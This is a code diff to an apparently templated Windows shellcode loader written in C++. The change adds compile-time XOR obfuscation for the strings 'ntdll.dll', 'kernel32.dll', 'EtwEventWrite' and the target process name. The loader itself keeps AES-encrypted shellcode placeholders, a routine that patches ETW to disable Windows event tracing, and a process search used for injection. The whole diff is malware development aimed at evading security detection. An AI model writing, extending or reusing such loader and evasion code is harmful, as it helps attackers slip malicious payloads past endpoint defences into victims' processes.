@@ -17,82 +17,64 @@
 #include <tlhelp32.h>
 
 #pragma comment(lib, "bcrypt.lib")
-// working compiler command: x86_64-w64-mingw32-g++     -O2 -s -fno-exceptions -fno-rtti     -ffunction-sections -fdata-sections -Wl,--gc-sections     -static -mwindows     -o loader.exe loader.cpp     -lbcrypt -lws2_32
+
+// Runtime decrypted strings with helper macro
+template <int N, int K>
+struct ObfuscatedString
+{
+    char data[N];
+
+    constexpr ObfuscatedString(const char (&str)[N], const char (&key)[K]) : data{}
+    {
+        for (int i = 0; i < N; i++)
+        {
+            data[i] = str[i] ^ key[i % K];
+        }
+    }
+
+    void decrypt(char *output, char *key) const
+    {
+        for (int i = 0; i < N; i++)
+        {
+            output[i] = data[i] ^ key[i % K];
+        }
+    }
+};
+
+#define OBFSTR(str, key) []() -> const char * { \
+    constexpr auto obf = ObfuscatedString<sizeof(str), sizeof(key)>(str, key); \
+    static char decrypted[sizeof(str)]; \
+    obf.decrypt(decrypted, key); \
+    return decrypted; }()
+
 // ============================================================
 // SECTION 1: AES-256 Encrypted Shellcode (from aes_encrypt.py)
 // ============================================================
 
-// unsigned char aes_key[] = {
-//     0x60, 0x72, 0xa3, 0x14, 0xb5, 0xc6, 0xd7, 0xe8,
-//     0xf9, 0x0a, 0x1b, 0x2c, 0x3d, 0x4e, 0x5f, 0x60,
-//     0x71, 0x82, 0x93, 0xa4, 0xb5, 0xc6, 0xd7, 0xe8,
-//     0xf9, 0x0a, 0x1b, 0x2c, 0x3d, 0x4e, 0x5f, 0x60};
-
-// unsigned char aes_iv[] = {
-//     0xa1, 0xb2, 0xc3, 0xd4, 0xe5, 0xf6, 0x07, 0x18,
-//     0x29, 0x3a, 0x4b, 0x5c, 0x6d, 0x7e, 0x8f, 0x90};
-
-// unsigned char encrypted_shellcode[] = {
-//     // Paste AES-encrypted shellcode from Python script
-//     0x00 // placeholder
-// };
-
 unsigned char encrypted_shellcode[] = {${SHELLCODE}};
 unsigned char aes_key[] = {${KEY}};
 unsigned char aes_iv[] = {${IV}};
-// SIZE_T original_shellcode_size = 236; // Update from Python output
-
+// constexpr unsigned char xor_key[] = {${XOR_KEY}};
 // ============================================================
 // SECTION 2: Stack Strings (no strings in .rdata)
 // ============================================================
 
-void BuildString_ntdll(char *out)
+const char *BuildString_ntdll()
 {
-    out[0] = 'n';
-    out[1] = 't';
-    out[2] = 'd';
-    out[3] = 'l';
-    out[4] = 'l';
-    out[5] = '.';
-    out[6] = 'd';
-    out[7] = 'l';
-    out[8] = 'l';
-    out[9] = '\0';
+    const char *str = OBFSTR("ntdll.dll", "${XOR_KEY}");
+    return str;
 }
 
-void BuildString_kernel32(char *out)
+const char *BuildString_kernel32()
 {
-    out[0] = 'k';
-    out[1] = 'e';
-    out[2] = 'r';
-    out[3] = 'n';
-    out[4] = 'e';
-    out[5] = 'l';
-    out[6] = '3';
-    out[7] = '2';
-    out[8] = '.';
-    out[9] = 'd';
-    out[10] = 'l';
-    out[11] = 'l';
-    out[12] = '\0';
+    const char *str = OBFSTR("kernel32.dll", "${XOR_KEY}");
+    return str;
 }
 
-void BuildString_EtwEventWrite(char *out)
+const char *BuildString_EtwEventWrite()
 {
-    out[0] = 'E';
-    out[1] = 't';
-    out[2] = 'w';
-    out[3] = 'E';
-    out[4] = 'v';
-    out[5] = 'e';
-    out[6] = 'n';
-    out[7] = 't';
-    out[8] = 'W';
-    out[9] = 'r';
-    out[10] = 'i';
-    out[11] = 't';
-    out[12] = 'e';
-    out[13] = '\0';
+    const char *str = OBFSTR("EtwEventWrite", "${XOR_KEY}");
+    return str;
 }
 
 // ============================================================
@@ -101,10 +83,8 @@ void BuildString_EtwEventWrite(char *out)
 
 void PatchETW()
 {
-    char ntdll[10];
-    BuildString_ntdll(ntdll);
-    char etwFunc[14];
-    BuildString_EtwEventWrite(etwFunc);
+    const char *ntdll = BuildString_ntdll();
+    const char *etwFunc = BuildString_EtwEventWrite();
 
     HMODULE hNtdll = GetModuleHandleA(ntdll);
     if (!hNtdll)
@@ -199,30 +179,14 @@ BOOL AESDecrypt(unsigned char *ct, SIZE_T ct_len,
 
 DWORD FindTargetProcess()
 {
-    // TODO: replace with xored TARGET_PROCESS to enable dynamicism and avoid leaving clues in binary`
-    // Build target name on stack
-    // char target[16];
-    // target[0] = 'e';
-    // target[1] = 'x';
-    // target[2] = 'p';
-    // target[3] = 'l';
-    // target[4] = 'o';
-    // target[5] = 'r';
-    // target[6] = 'e';
-    // target[7] = 'r';
-    // target[8] = '.';
-    // target[9] = 'e';
-    // target[10] = 'x';
-    // target[11] = 'e';
-    // target[12] = '\0';
-
+    const char *target = OBFSTR("${TARGET_PROCESS}", "${XOR_KEY}");
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     PROCESSENTRY32 pe = {sizeof(pe)};
     if (Process32First(snap, &pe))
     {
         do
         {
-            if (_stricmp(pe.szExeFile, "${TARGET_PROCESS}") == 0)
+            if (_stricmp(pe.szExeFile, target) == 0)
             {
                 CloseHandle(snap);
                 return pe.th32ProcessID;
@@ -278,8 +242,7 @@ int main()
     PatchETW();
 
     // ---- Phase 2: Resolve APIs ----
-    char ntdll[10];
-    BuildString_ntdll(ntdll);
+    const char *ntdll = BuildString_ntdll();
     HMODULE hNtdll = GetModuleHandleA(ntdll);
     if (!hNtdll)
         return 1;
